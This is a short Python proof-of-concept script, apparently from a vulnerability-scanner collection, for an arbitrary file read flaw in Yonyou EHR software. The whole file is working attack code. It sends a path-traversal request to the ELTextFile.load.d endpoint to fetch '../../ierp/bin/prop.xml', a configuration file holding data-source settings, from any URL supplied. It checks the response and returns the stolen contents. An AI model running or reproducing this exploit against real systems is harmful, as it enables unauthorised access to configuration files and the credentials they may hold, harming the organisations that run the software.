#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友EHR 任意文件读取
referer: http://www.wooyun.org/bugs/wooyun-2014-066512
author: Lucifer
description: 文件/hrss/ELTextFile.load.d中,参数src存在任意文件读取漏洞,可获取敏感信息。
'''
import sys
import requests
import warnings
from termcolor import cprint

class yonyou_ehr_ELTextFile_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml" and r"<dataSource>" in req.text:
                cprint("[+]存在用友EHR 任意文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "用友EHR 任意文件读取", payload, req.text
            else:
                cprint("[-]不存在yonyou_ehr_ELTextFile漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = yonyou_ehr_ELTextFile_BaseVerify(sys.argv[1])
    testVuln.run()